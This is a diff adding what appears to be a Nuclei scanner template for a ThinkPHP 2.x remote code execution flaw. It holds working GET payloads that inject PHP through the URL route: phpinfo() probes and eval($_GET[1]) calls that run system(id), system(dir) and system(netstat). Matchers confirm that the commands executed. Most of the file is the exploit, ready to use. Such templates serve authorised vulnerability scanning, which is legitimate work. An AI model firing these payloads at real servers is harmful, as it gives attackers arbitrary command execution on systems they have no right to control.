@@ -1,0 +1,23 @@
+id: thinkphp2-rce
+
+info:
+  name: ThinkPHP 2.x Remote Code Execution (Optimized)
+  author: venom
+  severity: critical
+  description: thinkphp 2.x rce
+  tags: thinkphp
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?s=/index/index/name/$%7B@phpinfo()%7D"
+      - "{{BaseURL}}?s=/a/b/c/${@phpinfo()}"
+      - "{{BaseURL}}?s=/a/b/c/${@eval($_GET[1])}&1=system(id);"
+      - "{{BaseURL}}?s=/a/b/c/${@eval($_GET[1])}&1=system(dir);"
+      - "{{BaseURL}}?s=/a/b/c/${@eval($_GET[1])}&1=system(netstat);"
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body, "PHP Core") || contains(body, "PHP Variables")||contains(body, "PHP License")||contains(body, "uid=")||contains(body, "groups=")||contains(body, "gid=")||contains(body, "x86_64")||contains(body, "i686")||contains(body, "i386")||contains(body, "ESTABLISHED")||contains(body, "CLOSE_WAIT")||contains(body, "LAST_ACK")||contains(body, "TIME_WAIT")||contains(body, "GNU/Linux")||contains(body, "<DIR>")'
